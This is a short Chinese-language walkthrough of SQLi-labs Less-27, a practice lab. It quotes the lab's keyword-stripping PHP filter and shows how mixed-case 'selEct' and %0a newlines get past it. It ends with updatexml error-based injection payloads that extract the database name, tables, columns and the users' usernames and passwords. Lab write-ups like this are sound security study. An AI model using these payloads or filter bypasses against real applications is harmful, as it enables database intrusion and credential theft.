---
title: less27
url: https://www.yuque.com/u29002979/ep2zrx/ou09sqdkpugeowuf
---

```bash
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";

$id= preg_replace('/[\/*]/',"", $id);		//strip out /*
$id= preg_replace('/[--]/',"", $id);		//Strip out --.
$id= preg_replace('/[#]/',"", $id);			//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.

$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/union/s',"", $id);	    //Strip out union
$id= preg_replace('/select/s',"", $id);	    //Strip out select
$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
$id= preg_replace('/Select/s',"", $id);	    //Strip out select
```

新增加**union,select,UNION,SELECT,Union,Select**被过滤。

> 空格，换行——> %0a

and，or没有被过滤。
针对php这种弱类型语言，可以采用**部分大写部分小写绕过** **selEct**

> All Your UNTON and SELEBCT belong to US.

**union和select**也被过滤了。 <a name="F1rLT"></a>

# 注入点检查

`1'`

> **Warning**: mysql\_fetch\_array() expects parameter 1 to be resource, boolean given in **E:\phpstudy\_pro\WWW\sql.com\Less-27\index.php** on line **36**
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

用单引号闭合**'**

<a name="l8hNe"></a>

# 报错注入

```bash
爆破数据库名称
1'and%0aupdatexml(1,concat(0x7e,database(),0x7e),1)or'
爆破数据表名称
1'and%0aupdatexml(1,concat(0x7e,(selEct%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()),0x7e),1)or'1
爆破字段名
1'and%0aupdatexml(1,concat(0x7e,(selEct%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name='users'),0x7e),1)or'1
爆破字段内容
1'and%0aupdatexml(1,concat(0x7e,(selEct(group_concat(username,0x7e,password))from%0ausers),0x7e),1)||'
```
